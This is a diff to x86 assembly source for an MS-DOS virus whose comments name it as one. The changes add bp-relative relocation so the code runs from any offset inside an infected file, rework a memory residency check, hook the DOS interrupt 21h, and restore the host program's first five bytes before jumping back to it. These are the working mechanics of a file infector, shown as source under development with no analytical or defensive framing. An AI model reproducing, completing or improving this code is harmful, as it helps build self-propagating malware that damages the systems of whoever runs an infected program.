@@ -30,26 +30,26 @@ push cs
 pop ds 
 push cs
 pop es
-lea si, Sstart
+lea si, bp+Sstart
 call Printf 
 ;VIRUS RESIDENCY CHECK 
 mov ax, nVirusID
-int nISRNumber   
-cmp bx, nVirusID ;virus are installed ?
+add ax,bp
+int 08h 
+mov ax, nVirusID
+add ax,bp 
+cmp bx, ax ;virus are installed ?
 je VIRUS_ALREADY_INSTALLED
-; create new dta
-
-
 ; INSTALL NEW ISR FOR INT 21h 
-lea si,newisr
+lea si,bp+newisr
 call Printf 
 mov al, nISRNumber
-lea si, dwOldExecISR
-lea dx, NewDosISR
+lea si, bp+dwOldExecISR
+lea dx, bP+NewDosISR
 call HookISR  
   
 VIRUS_ALREADY_INSTALLED:
-lea si,finish
+lea si,bp+finish
 call Printf 
 
 GetRelocation bp
@@ -60,6 +60,10 @@ push cs
 push cs
 pop ds
 pop es
+mov di, 100h
+lea si, bp+HostBytesOld
+mov cx,5 ;restore 5 bytes
+rep movsb
 mov bx, 100h ;put old start-adres on stack (The original program)
 push bx
 ret ;transfer to host program
